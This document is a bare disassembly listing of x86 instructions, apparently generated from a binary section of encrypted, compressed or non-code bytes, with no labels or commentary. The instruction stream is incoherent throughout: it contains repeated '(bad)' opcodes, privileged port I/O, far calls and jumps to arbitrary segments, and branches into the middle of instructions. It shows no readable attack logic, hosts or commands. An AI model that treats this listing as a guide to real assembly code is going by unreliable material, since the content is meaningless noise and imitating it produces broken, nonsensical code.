  40480c:	scas   eax,DWORD PTR es:[edi]
  40480d:	and    DWORD PTR [ecx+0x30],esi
  404810:	jns    0x404807
  404812:	enter  0xbcf8,0xa2
  404816:	fcom   DWORD PTR [edi-0x26521116]
  40481c:	and    al,0xd6
  40481e:	imul   ebx,DWORD PTR [si-0x6d],0xfffffff9
  404823:	retf   0x1576
  404826:	out    dx,eax
  404827:	push   ebp
  404828:	mov    ch,0xbd
  40482a:	das    
  40482b:	lahf   
  40482c:	jno    0x4047b6
  40482e:	outs   dx,BYTE PTR ds:[esi]
  40482f:	into   
  404830:	pop    ds
  404831:	pop    edi
  404832:	shr    eax,cl
  404834:	dec    edi
  404835:	imul   ebx,DWORD PTR [edx+0x7d],0x0
  404839:	mov    ebp,0xa66acc9a
  40483e:	push   cs
  40483f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404840:	and    ah,bl
  404842:	adc    DWORD PTR [ebp+0x4816e7d1],ebx
  404848:	add    ebp,DWORD PTR [edx+0xf]
  40484b:	adc    eax,DWORD PTR [edi-0x3b]
  40484e:	add    ebx,ebx
  404850:	mov    dh,0xf4
  404852:	stc    
  404853:	out    0x12,al
  404855:	push   ss
  404856:	sub    DWORD PTR [edi],ebx
  404858:	inc    ecx
  404859:	inc    esp
  40485a:	imul   ebx,DWORD PTR ds:0xe075105d,0xffffff9a
  404861:	retf   
  404862:	mov    eax,es:0xdd64ceb6
  404868:	mov    edx,0xbb2c6615
  40486d:	mov    DWORD PTR [edx],ecx
  40486f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404870:	bound  esp,QWORD PTR ds:[edi-0x149c3d89]
  404877:	pop    ecx
  404878:	push   ebx
  404879:	(bad)  
  40487a:	repz test BYTE PTR [ebx+edi*8],dh
  40487e:	mov    ebx,0x808e14f7
  404883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404884:	jp     0x4048e3
  404886:	in     eax,dx
  404887:	mov    ah,0xfb
  404889:	jae    0x4048c9
  40488b:	add    DWORD PTR [esi+0xe972af5],0xffffffaa
  404892:	sbb    eax,0xbe11cbf5
  404897:	cmp    ch,BYTE PTR [eax+ebp*2-0xfff32b0]
  40489e:	push   ebp
  40489f:	xor    DWORD PTR [edx+0x418b3b94],0xeb6307c1
  4048a9:	bound  edx,QWORD PTR [eax+eax*2+0x46]
  4048ad:	iret   
  4048ae:	call   0xb58b062b
  4048b3:	sub    eax,0xc0f183de
  4048b8:	adc    BYTE PTR [ecx-0x6],0x5c
  4048bc:	or     DWORD PTR fs:[ecx+0x6e],ebx
  4048c0:	data16 or al,0x9e
  4048c3:	enter  0xee7c,0x4b
  4048c7:	xchg   ebp,eax
  4048c8:	into   
  4048c9:	mov    ds:0x93ef6399,eax
  4048ce:	pop    es
  4048cf:	dec    edx
  4048d0:	sti    
  4048d1:	xor    BYTE PTR [ebp+0x5],dl
  4048d4:	ins    BYTE PTR es:[edi],dx
  4048d5:	pop    esi
  4048d6:	or     al,0xde
  4048d8:	sub    edx,DWORD PTR [eax+0x41]
  4048db:	loop   0x4048b3
  4048dd:	push   0xfffffffb
  4048df:	dec    ecx
  4048e0:	les    edi,FWORD PTR [esp+eax*4-0x80]
  4048e4:	outs   dx,DWORD PTR ds:[esi]
  4048e5:	cmp    esi,DWORD PTR [ecx-0x69936702]
  4048eb:	ss mov cl,0x26
  4048ee:	cmp    eax,ebx
  4048f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048f1:	dec    eax
  4048f2:	jge    0x404929
  4048f4:	mov    eax,ds:0xf93af562
  4048f9:	inc    ebp
  4048fa:	cmp    al,0xb4
  4048fc:	mov    ah,0xee
  4048fe:	pop    es
  4048ff:	or     BYTE PTR [ecx],0x6b
  404902:	(bad)  
  404903:	stc    
  404904:	ficom  DWORD PTR [ecx+edx*1+0x7c4d6b95]
  40490b:	adc    eax,0xdda7821e
  404910:	test   DWORD PTR [edx+esi*4],esp
  404913:	fsub   DWORD PTR [ebx+eiz*8]
  404916:	sub    BYTE PTR [eax+0x2cc1135a],dl
  40491c:	repnz mov al,0x98
  40491f:	outs   dx,DWORD PTR ds:[si]
  404921:	add    DWORD PTR [esi+edi*1-0xe842984],ecx
  404928:	mov    WORD PTR [eax+0x25],fs
  40492b:	hlt    
  40492c:	jl     0x40494d
  40492e:	fs mov ch,0xf6
  404931:	mov    edx,0x71848783
  404936:	sub    bh,BYTE PTR [ecx-0x6c]
  404939:	popa   
  40493a:	cmp    bl,al
  40493c:	into   
  40493d:	jb     0x4048c1
  40493f:	push   edx
  404940:	out    dx,al
  404941:	jo     0x40499f
  404943:	mov    cl,dh
  404945:	arpl   di,sp
  404947:	jle    0x404989
  404949:	mov    BYTE PTR [esi+edx*4],0x41
  40494d:	xchg   ecx,eax
  40494e:	pop    eax
  40494f:	cmp    BYTE PTR [esi],dh
  404951:	lds    esp,FWORD PTR [ebp+0x3d3c6a48]
  404957:	mov    bh,0xb
  404959:	aaa    
  40495a:	cmp    eax,0x6bf4ed36
  40495f:	add    edx,DWORD PTR [edi+0xb0593b0]
  404965:	pop    ss
  404966:	call   0xc934b044
  40496b:	sub    BYTE PTR [ebx-0x34],0x45
  40496f:	scas   al,BYTE PTR es:[edi]
  404970:	inc    edi
  404971:	jnp    0x40498b
  404973:	stc    
  404974:	mov    esi,0x3805371a
  404979:	dec    edx
  40497a:	cmp    al,0x4a
  40497c:	dec    esp
  40497d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40497e:	clc    
  40497f:	rcr    DWORD PTR [ecx-0xbe73ff],0xb5
  404986:	mov    edi,0x2068d8a6
  40498b:	dec    esi
  40498c:	pop    esi
  40498d:	in     al,dx
  40498e:	and    bl,ch
  404990:	imul   eax,DWORD PTR [eax-0x43],0xffffff85
  404994:	xor    DWORD PTR [edi+ecx*2],edx
  404997:	aam    0xcb
  404999:	(bad)  
  40499a:	sub    BYTE PTR [edx-0x51],dh
  40499d:	or     al,0x2f
  40499f:	arpl   WORD PTR [eax+0x66686af7],cx
  4049a5:	mov    ch,0x4b
  4049a7:	call   0xf265:0x9dea088f
  4049ae:	xchg   esp,eax
  4049af:	or     bh,al
  4049b1:	push   esp
  4049b2:	imul   eax,esi,0xc39e5c92
  4049b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049b9:	int3   
  4049ba:	js     0x404970
  4049bc:	dec    ecx
  4049bd:	cmp    ch,BYTE PTR [ebp-0x22]
  4049c0:	sbb    al,0x7e
  4049c2:	mov    ds:0x959c20bb,eax
  4049c7:	sti    
  4049c8:	mov    eax,ds:0x8c7de2f7
  4049cd:	fld    DWORD PTR [ebx-0x67075247]
  4049d3:	repz or al,0xf0
  4049d6:	sar    DWORD PTR [edx+0x17b6bd1c],1
  4049dc:	xor    eax,0xeb0f78e5
  4049e1:	in     al,0x34
  4049e3:	lds    ebp,FWORD PTR [eax+0x29]
  4049e6:	repnz add bl,dh
  4049e9:	add    cl,BYTE PTR [eax-0x2f]
  4049ec:	in     al,0xd2
  4049ee:	in     eax,dx
  4049ef:	mov    ecx,0xfaef0a03
  4049f4:	inc    edx
  4049f5:	out    dx,eax
  4049f6:	ret    0xd5ae
  4049f9:	scas   al,BYTE PTR es:[edi]
  4049fa:	fist   WORD PTR ds:0xf12db2c9
  404a00:	sub    al,0xc7
  404a02:	cmp    ah,dl
  404a04:	jns    0x4049a5
  404a06:	dec    esi
  404a07:	outs   dx,DWORD PTR ds:[esi]
  404a08:	xor    eax,0x6e565b16
  404a0d:	add    ebx,edi
  404a0f:	or     al,0xee
  404a11:	jmp    0xd67d9326
  404a16:	int3   
  404a17:	loopne 0x4049ef
  404a19:	sbb    al,0x52
  404a1b:	nop
  404a1c:	jo     0x404a4a
  404a1e:	jle    0x404a97
  404a20:	push   edx
  404a21:	repnz cmp edi,ebp
  404a24:	std    
  404a25:	sub    DWORD PTR [esi-0x6a],eax
  404a28:	xchg   ebx,eax
  404a29:	mov    esi,0xeab713f5
  404a2e:	and    al,BYTE PTR [ebx+0x21]
  404a31:	push   eax
  404a32:	xor    DWORD PTR [ecx-0x56],ebx
  404a35:	(bad)  
  404a36:	loope  0x404a65
  404a38:	in     al,0x63
  404a3a:	sbb    bl,BYTE PTR [ecx]
  404a3c:	adc    eax,DWORD PTR [ebx-0x58]
  404a3f:	outs   dx,DWORD PTR ds:[esi]
  404a40:	js     0x404a78
  404a42:	cmp    eax,0x4bb83359
  404a47:	mov    dl,0x29
  404a49:	mov    edx,0xf7d5f896
  404a4e:	inc    ebx
  404a4f:	outs   dx,DWORD PTR ds:[esi]
  404a50:	sbb    eax,0x65fec39a
  404a55:	sub    DWORD PTR [esi-0x7b],ebx
  404a58:	jle    0x4049e0
  404a5a:	dec    BYTE PTR [ebp-0x6b616230]
  404a60:	(bad)  [eax+0x43a2a43e]
  404a66:	inc    eax
  404a67:	aaa    
  404a68:	xchg   esp,eax
  404a69:	cmp    esi,edi
  404a6b:	mov    ch,0xd8
  404a6d:	push   ebx
  404a6e:	pop    ebp
  404a6f:	clc    
  404a70:	mov    ah,0xec
  404a72:	retf   
  404a73:	dec    esp
  404a74:	add    eax,0xb42b06ed
  404a79:	mov    edi,0xb1a83fbd
  404a7e:	into   
  404a7f:	stc    
  404a80:	loop   0x404ac9
  404a82:	jmp    0x2e868033
  404a87:	test   DWORD PTR [edi],edi
  404a89:	sbb    DWORD PTR [edx+0x33b4c66f],edx
  404a8f:	fiadd  WORD PTR ds:0xe78c0b71
  404a95:	dec    esi
  404a96:	add    dl,BYTE PTR [eax+0x3d6e47f8]
  404a9c:	fcom   DWORD PTR [edx+0x56]
  404a9f:	aad    0xce
  404aa1:	sar    BYTE PTR gs:[esi],cl
  404aa4:	in     al,0xe5
  404aa6:	xchg   ebx,eax
  404aa7:	sbb    dl,cl
  404aa9:	mov    bl,0xbc
  404aab:	retf   0x4428
  404aae:	arpl   WORD PTR [ecx+0x8edfa5e],dx
  404ab4:	push   0xffffffc8
  404ab6:	push   esp
  404ab7:	push   es
  404ab8:	inc    ebp
  404ab9:	sub    esi,DWORD PTR [ecx+0x51553899]
  404abf:	pop    es
  404ac0:	jnp    0x404ad5
  404ac2:	jbe    0x404ad2
  404ac4:	cld    
  404ac5:	stc    
  404ac6:	mov    BYTE PTR [edi+eax*2],cl
  404ac9:	test   BYTE PTR [eax],dl
  404acb:	imul   esp,DWORD PTR [edx-0x7],0xffffffce
  404acf:	scas   eax,DWORD PTR es:[edi]
  404ad0:	das    
  404ad1:	into   
  404ad2:	dec    esi
  404ad3:	sub    al,0x96
  404ad5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ad6:	sbb    bh,BYTE PTR [esi+0x3ea7f3ee]
  404adc:	xchg   BYTE PTR [eax],ch
  404ade:	clc    
  404adf:	pusha  
  404ae0:	cmp    DWORD PTR [esi+0x21f3cf4a],edi
  404ae6:	sahf   
  404ae7:	out    0xe8,eax
  404ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404aea:	lea    ecx,ds:0x8f2912ce
  404af0:	adc    DWORD PTR [esi-0x3f15ba46],ebp
  404af6:	jbe    0x404ac7
  404af8:	fcomip st,st(3)
  404afa:	sbb    bl,bl
  404afc:	ja     0x404b64
  404afe:	mov    al,0x28
  404b00:	call   FWORD PTR [eax+0x611f0dd6]
  404b06:	pop    esi
  404b07:	in     al,0x9f
  404b09:	(bad)  
  404b0a:	push   eax
  404b0b:	cdq    
  404b0c:	dec    BYTE PTR [edi+ebx*8-0x60]
  404b10:	das    
  404b11:	xor    al,0x86
  404b13:	in     al,dx
  404b14:	push   0xe03b5c45
  404b19:	push   esi
  404b1a:	xchg   ebx,eax
  404b1b:	adc    DWORD PTR [edx+0x408059ab],0xfffffff1
  404b22:	(bad)  
  404b23:	or     eax,0x3239035e
  404b28:	call   0xe248f19f
  404b2d:	shl    edi,0x2
  404b30:	pop    ecx
  404b31:	in     al,dx
  404b32:	push   ecx
  404b33:	sub    BYTE PTR [esi],bh
  404b35:	mov    dl,0x8a
  404b37:	inc    edx
  404b38:	sbb    al,0x21
  404b3a:	lods   al,BYTE PTR ds:[esi]
  404b3b:	popf   
  404b3c:	or     edi,esi
  404b3e:	gs mov esp,0x3a8c7447
  404b44:	in     al,0xf9
  404b46:	jge    0x404b51
  404b48:	jmp    0x404ae9
  404b4a:	push   ecx
  404b4b:	test   al,0x6a
  404b4d:	fisubr DWORD PTR [ecx-0x635a203e]
  404b53:	ret    
  404b54:	sub    DWORD PTR [esi+0x5ff65aaa],esp
  404b5a:	or     al,0x3e
  404b5c:	out    0x4c,eax
  404b5e:	inc    eax
  404b5f:	sahf   
  404b60:	(bad)  
  404b62:	mov    bl,BYTE PTR [edx+0x5f5adb9c]
  404b68:	pusha  
  404b69:	iret   
  404b6a:	jae    0x404afd
  404b6c:	adc    esp,esi
  404b6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b6f:	add    al,0xec
  404b71:	test   BYTE PTR ds:0x2c10c748,dh
  404b77:	push   eax
  404b78:	retf   0x1482
  404b7b:	ins    BYTE PTR es:[edi],dx
  404b7c:	call   0x6eea84fd
  404b81:	push   edx
  404b82:	add    BYTE PTR [ebx+0x66a9914c],0x41
  404b89:	cs dec esi
  404b8b:	or     cl,BYTE PTR [edi]
  404b8d:	xchg   edi,eax
  404b8e:	adc    al,0x12
  404b90:	ins    DWORD PTR es:[edi],dx
  404b91:	retf   
  404b92:	sbb    DWORD PTR [ebx-0x1ccf1374],esp
  404b98:	dec    ebx
  404b99:	shl    BYTE PTR [esi],1
  404b9b:	xchg   ebp,eax
  404b9c:	sub    eax,0xdbbeda28
  404ba1:	mov    ecx,0x8c0e8aa8
  404ba6:	sub    BYTE PTR [esi],bh
  404ba8:	es xchg ebx,edx
  404bab:	sub    eax,0x343c5db0
  404bb0:	es int3 
  404bb2:	add    al,0x4b
  404bb4:	lods   eax,DWORD PTR ds:[esi]
  404bb5:	lahf   
  404bb6:	push   0x18848aa7
  404bbb:	sub    eax,0x88c1bc81
  404bc0:	jmp    0x8d49:0xe2d5173e
  404bc7:	inc    edx
  404bc8:	loope  0x404b8b
  404bca:	sub    DWORD PTR [edi],0x45010433
  404bd0:	int    0x51
  404bd2:	push   esp
  404bd3:	jns    0x404bc7
  404bd5:	lea    edi,[ebx]
  404bd7:	fild   QWORD PTR [ebx*1+0x919f425]
  404bde:	ja     0x404b83
  404be0:	(bad)  
  404be1:	nop
  404be2:	sahf   
  404be3:	mov    cl,BYTE PTR [edx+0x47]
  404be6:	jbe    0x404bc6
  404be8:	into   
  404be9:	push   ds
  404bea:	bound  ebp,QWORD PTR [edx+0x2c6eafbd]
  404bf0:	enter  0xc76,0xc2
  404bf4:	push   0x6f2a3844
  404bf9:	out    0xc6,al
  404bfb:	dec    edi
  404bfc:	push   eax
  404bfd:	push   esi
  404bfe:	stc    
  404bff:	cmp    al,0x37
  404c01:	mov    ebx,ebp
  404c03:	jg     0x404c30
  404c05:	jp     0x404bbd
  404c07:	jmp    0xbfc5:0x58332479
  404c0e:	stos   DWORD PTR es:[edi],eax
  404c0f:	ja     0x404c4b
  404c11:	or     eax,0x380b3773
  404c16:	pop    eax
  404c17:	imul   edx,ebx,0xcdca4c23
  404c1d:	mov    al,0x47
  404c1f:	test   BYTE PTR [esi+ecx*8-0x7600c7ab],ah
  404c26:	fstp   QWORD PTR [esp+eiz*4+0x3c]
  404c2a:	mov    ?,WORD PTR [ebx+ecx*4]
  404c2d:	mov    bh,0xde
  404c2f:	mov    WORD PTR [eax],ss
  404c31:	jns    0x404bce
  404c33:	aas    
  404c34:	jmp    0x9fa1:0xc2a725e3
  404c3b:	sbb    edx,DWORD PTR [ebx]
  404c3d:	and    bl,BYTE PTR [ecx]
  404c3f:	fwait
  404c40:	shl    BYTE PTR [edx],0x75
  404c43:	adc    DWORD PTR [ebx+esi*4+0x5f],edi
  404c47:	not    esi
  404c49:	mov    es,WORD PTR [edi+esi*4]
  404c4c:	lahf   
  404c4d:	push   DWORD PTR [eax]
  404c4f:	xchg   edx,ebp
  404c51:	and    eax,0xac9949b9
  404c56:	mov    edx,0x2fd82648
  404c5b:	fistp  DWORD PTR [edx]
  404c5d:	mov    bh,0xa4
  404c5f:	jae    0x404c7a
  404c61:	push   es
  404c62:	xchg   esi,ecx
  404c64:	jmp    0x404c3d
  404c66:	sbb    dl,BYTE PTR [edx]
  404c68:	pop    ss
  404c69:	lds    edx,FWORD PTR [edi+0x7c1567e1]
  404c6f:	in     eax,dx
  404c70:	xchg   edx,eax
  404c71:	xchg   ecx,eax
  404c72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c73:	mov    eax,0x76ac4bb7
  404c78:	push   ds
  404c79:	and    eax,0x5c738397
  404c7e:	fnstsw WORD PTR [edx+0xd]
  404c81:	rcr    BYTE PTR [ebx-0x25],cl
  404c84:	inc    edi
  404c85:	jbe    0x404ccf
  404c87:	loop   0x404cd8
  404c89:	dec    ebp
  404c8a:	mov    ds:0xcfd3031,eax
  404c8f:	imul   BYTE PTR [ecx-0x7c]
  404c92:	shl    BYTE PTR [edi],0x2a
  404c95:	popa   
  404c96:	add    DWORD PTR [ebx-0x1e61c746],ebx
  404c9c:	fdiv   DWORD PTR [esi+0x1d]
  404c9f:	mov    esi,0xcaa87201
  404ca4:	mov    dl,bh
  404ca6:	xchg   esp,eax
  404ca7:	imul   ecx,DWORD PTR fs:[ecx+0x23],0x9966a362
  404caf:	and    DWORD PTR [ebx+0x22],eax
  404cb2:	scas   al,BYTE PTR es:[edi]
  404cb3:	adc    DWORD PTR [esi+ebx*1],edi
  404cb6:	push   0xffffffc4
  404cb8:	push   0x3ebb9e75
  404cbd:	out    0x11,al
  404cbf:	inc    ebp
  404cc0:	push   0xd1cd7ce4
  404cc5:	xchg   ecx,eax
  404cc6:	dec    ecx
  404cc7:	jnp    0x404d1f
  404cc9:	jno    0x404d1b
  404ccb:	sahf   
  404ccc:	imul   ecx,DWORD PTR [ecx-0x1f4d22c9],0x41
  404cd3:	jmp    0x1c98:0xd46a9d8a
  404cda:	cmp    al,0x8d
  404cdc:	in     al,0x97
  404cde:	stos   DWORD PTR es:[edi],eax
  404cdf:	(bad)  
  404ce1:	out    0xa2,eax
  404ce3:	or     BYTE PTR [esi],ch
  404ce5:	mov    esp,DWORD PTR [ebp-0x1]
  404ce8:	fistp  DWORD PTR [edx-0x524aeb19]
  404cee:	cmp    eax,0x33f54c96
  404cf3:	mov    ebp,0xbd5dcc78
  404cf8:	dec    BYTE PTR [ebp-0x2c707034]
  404cfe:	pop    edi
  404cff:	dec    ecx
  404d00:	sbb    DWORD PTR [esi-0x1a24d7bd],edx
  404d06:	in     eax,0xce
  404d08:	push   es
  404d09:	push   ebx
  404d0a:	mov    BYTE PTR [ecx+0x22843c6d],dh
  404d10:	jns    0x404d38
  404d12:	inc    eax
  404d13:	sbb    ebp,DWORD PTR [eax+0x3c823868]
  404d19:	aas    
  404d1a:	icebp  
  404d1b:	cmc    
  404d1c:	aam    0x21
  404d1e:	mov    al,ds:0x8dfeed91
  404d23:	imul   edi,DWORD PTR [edi+0x4d],0xffffffd4
  404d27:	sub    esi,DWORD PTR [edi+0x513850a5]
  404d2d:	pop    ebp
  404d2e:	icebp  
  404d2f:	out    dx,eax
  404d30:	jl     0x404d24
  404d32:	dec    ebp
  404d33:	mov    esp,0x9db88515
  404d38:	(bad)  
  404d39:	jecxz  0x404cdd
  404d3b:	cmp    eax,DWORD PTR [ebx-0x4]
  404d3e:	xchg   ebp,eax
  404d3f:	xchg   ecx,eax
  404d40:	outs   dx,DWORD PTR ds:[esi]
  404d41:	xchg   edx,eax
  404d42:	pop    eax
  404d43:	rcr    DWORD PTR [edi],cl
  404d45:	mov    BYTE PTR [ecx-0x756f4d19],dh
  404d4b:	inc    ebp
  404d4c:	stc    
  404d4d:	jo     0x404d7c
  404d4f:	xchg   DWORD PTR [esi+0x79af075d],ebp
  404d55:	lods   al,BYTE PTR ds:[esi]
  404d56:	mov    esi,0x2d734d83
  404d5b:	push   ss
  404d5c:	leave  
  404d5d:	mov    cl,0x2f
  404d5f:	loopne 0x404ddb
  404d61:	lock mov bh,0x73
  404d64:	or     BYTE PTR [edi-0x36],0xb0
  404d68:	mov    eax,ds:0x59b0f618
  404d6d:	jp     0x404d10
  404d6f:	xchg   esp,eax
  404d70:	inc    esi
  404d71:	scas   eax,DWORD PTR es:[edi]
  404d72:	lds    esi,FWORD PTR [ebp-0x49]
  404d75:	adc    dh,BYTE PTR [ebp-0x2985dfa1]
  404d7b:	in     eax,0x1
  404d7d:	cld    
  404d7e:	cs ja  0x404dbc
  404d81:	leave  
  404d82:	dec    ebx
  404d83:	test   BYTE PTR [ecx+0x1658a7e6],dl
  404d89:	lds    ebx,FWORD PTR [ecx]
  404d8b:	adc    eax,0x7a4c04d9
  404d90:	sahf   
  404d91:	dec    edi
  404d92:	inc    ebx
  404d93:	mov    bl,0xe0
  404d95:	cwde   
  404d96:	ds sahf 
  404d98:	inc    esi
  404d99:	pusha  
  404d9a:	sub    edi,DWORD PTR [ecx-0x6406e5e4]
  404da0:	ret    0xa079
  404da3:	push   0x771e3d1b
  404da8:	stc    
  404da9:	int    0xf1
  404dab:	sbb    eax,0xbe65fdf3
  404db0:	xchg   esi,eax
  404db1:	jae    0x404dce
  404db3:	jae    0x404db1
  404db5:	cmp    ebx,ecx
  404db7:	ret    
  404db8:	lock cmp al,0x7c
  404dbb:	out    dx,eax
  404dbc:	or     edx,DWORD PTR [edi]
  404dbe:	sbb    DWORD PTR [edi+0x30277103],eax
  404dc4:	neg    DWORD PTR ds:0xa2588676
  404dca:	test   al,0x36
  404dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dcd:	je     0x404e15
  404dcf:	imul   ebp,DWORD PTR [ecx-0x1],0x2f
  404dd3:	das    
  404dd4:	(bad)  
  404dd5:	xor    DWORD PTR [ebx-0x57d8c67f],eax
  404ddb:	les    ebx,FWORD PTR [esi-0x47]
  404dde:	sub    BYTE PTR [ebp+ebx*4-0x24ad4b29],dh
  404de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404de6:	(bad)  
  404de7:	ror    edx,cl
  404de9:	cmp    ebx,DWORD PTR [eax+0x79f21b71]
  404def:	mov    ds:0x278ab3cd,al
  404df4:	sbb    DWORD PTR [edx+edx*8+0x1ce7032e],0xffffffab
  404dfc:	dec    edx
  404dfd:	cmp    bl,BYTE PTR [edi+ebx*4-0x8]
  404e01:	xor    ecx,DWORD PTR [edi+edi*2]
  404e04:	call   0xfad2edca
  404e09:	cmp    ebx,esi
  404e0b:	and    eax,0x281c0e84
  404e10:	dec    esp
  404e11:	adc    eax,DWORD PTR [edx+0x553bce9d]
  404e17:	lods   eax,DWORD PTR ds:[esi]
  404e18:	fistp  WORD PTR [ebx-0x66]
  404e1b:	push   es
  404e1c:	les    ecx,FWORD PTR [ebx]
  404e1e:	in     al,0x58
  404e20:	jle    0x404e12
  404e22:	popf   
  404e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e24:	push   esp
  404e25:	stc    
  404e26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e27:	sbb    bh,BYTE PTR [esi-0x75]
  404e2a:	iret   
  404e2b:	pusha  
  404e2c:	pop    edx
  404e2d:	nop
  404e2e:	dec    eax
  404e2f:	xlat   BYTE PTR ds:[ebx]
  404e30:	fistp  DWORD PTR [edi]
  404e32:	pop    eax
  404e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e34:	mov    al,ds:0xc2c4cf4a
  404e39:	lahf   
  404e3a:	imul   esi,DWORD PTR [ebp-0x39],0x4b890a30
  404e41:	pop    DWORD PTR [eax+0x28]
  404e44:	cmp    al,0xb6
  404e46:	jg     0x404e77
  404e48:	jg     0x404e80
  404e4a:	dec    esp
  404e4b:	aaa    
  404e4c:	(bad)  
  404e4d:	sbb    bl,dl
  404e4f:	pop    edx
  404e50:	(bad)  
  404e51:	in     eax,0xe8
  404e53:	icebp  
  404e54:	sti    
  404e55:	call   0x2801:0xba0e2932
  404e5c:	fadd   DWORD PTR [eax]
  404e5e:	mov    edx,0xaaf60123
  404e63:	in     eax,dx
  404e64:	xchg   edi,eax
  404e65:	jbe    0x404e45
  404e67:	mov    ecx,0x7cc0bbef
  404e6c:	loopne 0x404e08
  404e6e:	cmp    eax,0x21bd93be
  404e73:	in     eax,0xfb
  404e75:	mov    DWORD PTR [edi],esp
  404e77:	mov    dl,0xfe
  404e79:	push   ds
  404e7a:	mov    dh,0x3e
  404e7c:	dec    ebx
  404e7d:	out    0xdc,al
  404e7f:	cmp    ecx,DWORD PTR [esi+0x6c11eda4]
  404e85:	(bad)  
  404e87:	loope  0x404e9a
  404e89:	jle    0x404e36
  404e8b:	cmp    al,0x1a
  404e8d:	enter  0xa4cb,0xd2
  404e91:	dec    eax
  404e92:	aad    0x8a
  404e94:	and    bh,BYTE PTR [edi+0x65]
  404e97:	mov    ebx,eax
  404e99:	mov    edx,0xab868b78
  404e9e:	aam    0x4c
  404ea0:	jnp    0x404ec6
  404ea2:	popa   
  404ea3:	stos   DWORD PTR es:[edi],eax
  404ea4:	loope  0x404ec9
  404ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ea7:	sar    ebx,cl
  404ea9:	and    al,0xe3
  404eab:	pmulhw mm0,QWORD PTR [ecx]
  404eae:	sub    ebp,ebp
  404eb0:	test   edx,ecx
  404eb2:	pusha  
  404eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eb4:	sub    ch,BYTE PTR [edi-0x4d79f030]
  404eba:	push   0x2a
  404ebc:	or     esp,esp
  404ebe:	add    eax,0x4bf056d0
  404ec3:	(bad)  
  404ec4:	jmp    0xc447:0xd58786dc
  404ecb:	and    al,0x45
  404ecd:	mov    eax,0x2100d5b4
  404ed2:	push   edi
  404ed3:	push   ds
  404ed4:	jns    0x404f27
  404ed6:	or     BYTE PTR [edx-0x7b],dh
  404ed9:	lods   eax,DWORD PTR ds:[esi]
  404eda:	in     eax,dx
  404edb:	mov    al,0xd6
  404edd:	pop    ebp
  404ede:	and    DWORD PTR [ebx],edi
  404ee0:	fst    DWORD PTR [ebp-0x2a]
  404ee3:	pop    eax
  404ee4:	jo     0x404e8d
  404ee6:	icebp  
  404ee7:	iret   
  404ee8:	daa    
  404ee9:	jnp    0x404f51
  404eeb:	in     al,dx
  404eec:	stos   BYTE PTR es:[edi],al
  404eed:	(bad)  
  404eee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404eef:	jns    0x404ea8
  404ef1:	dec    eax
  404ef2:	daa    
  404ef3:	sub    bl,0x39
  404ef6:	cdq    
  404ef7:	mov    WORD PTR [edi],es
  404ef9:	add    DWORD PTR ds:0xf7f131c4,eax
  404eff:	or     eax,0xf140607f
  404f04:	pop    ebp
  404f05:	fidiv  DWORD PTR [edx+0x324ea466]
  404f0b:	adc    al,0xc4
  404f0d:	inc    esp
  404f0e:	das    
  404f0f:	sub    BYTE PTR [edi-0xe15e73f],bl
  404f15:	push   edx
  404f16:	in     eax,0x94
  404f18:	pop    ss
  404f19:	pop    edx
  404f1a:	fld    TBYTE PTR [esi-0x47841bf5]
  404f20:	sbb    dl,BYTE PTR [eax+0x6f]
  404f23:	into   
  404f24:	cli    
  404f25:	sub    DWORD PTR [ebx],edi
  404f27:	shl    DWORD PTR [edx-0x5136d824],0x3e
  404f2e:	loop   0x404f91
  404f30:	inc    ebp
  404f31:	ficomp WORD PTR [edi-0x3cb97b3c]
  404f37:	scas   eax,DWORD PTR es:[edi]
  404f38:	inc    ebx
  404f39:	pop    eax
  404f3a:	fisubr WORD PTR [eax]
  404f3c:	outs   dx,DWORD PTR ds:[esi]
  404f3d:	dec    esp
  404f3e:	sbb    DWORD PTR ds:0xad1b5be3,edx
  404f44:	stc    
  404f45:	ja     0x404eef
  404f47:	test   BYTE PTR ds:0x443d53d0,cl
  404f4d:	out    dx,eax
  404f4e:	mov    edi,0x45208228
  404f53:	cmpxchg BYTE PTR [edi],dl
  404f56:	push   ss
  404f57:	inc    ebx
  404f58:	sub    eax,0xff7fa0aa
  404f5d:	push   edx
  404f5e:	imul   ebx,DWORD PTR [edi-0x36a70c1f],0xffffff88
  404f65:	dec    ebp
  404f66:	mov    dh,0x46
  404f68:	lea    ebx,ds:0xf037ffcc
  404f6f:	inc    edx
  404f70:	mov    edx,eax
  404f72:	jge    0x404f0b
  404f74:	fsubr  QWORD PTR [esi]
  404f76:	fadd   DWORD PTR [ebp+0x5b56c693]
  404f7c:	ficom  WORD PTR [ebx]
  404f7e:	and    BYTE PTR [ebx],ch
  404f80:	cdq    
  404f81:	xchg   esi,eax
  404f82:	(bad)  
  404f83:	push   ebx
  404f84:	imul   esp,esi,0xffffff94
  404f87:	sub    DWORD PTR ds:0xeb706167,esi
  404f8d:	inc    ebx
  404f8e:	mov    ecx,0x4eb2153d
  404f93:	ins    BYTE PTR es:[edi],dx
  404f94:	cmp    eax,DWORD PTR [ebp+0x8]
  404f97:	mov    al,BYTE PTR [ebx]
  404f99:	mov    BYTE PTR [esi],al
  404f9b:	inc    edi
  404f9c:	fnstenv [ebx-0x1ed2cdda]
  404fa2:	jbe    0x404f41
  404fa4:	lds    esp,FWORD PTR [edx+eax*1-0x55]
  404fa8:	mov    al,ds:0x1752727e
  404fad:	aaa    
  404fae:	push   esi
  404faf:	mov    ah,0x10
  404fb1:	mov    cl,0x9c
  404fb3:	mov    ch,0x4e
  404fb5:	adc    al,0x8a
  404fb7:	sub    al,0x1b
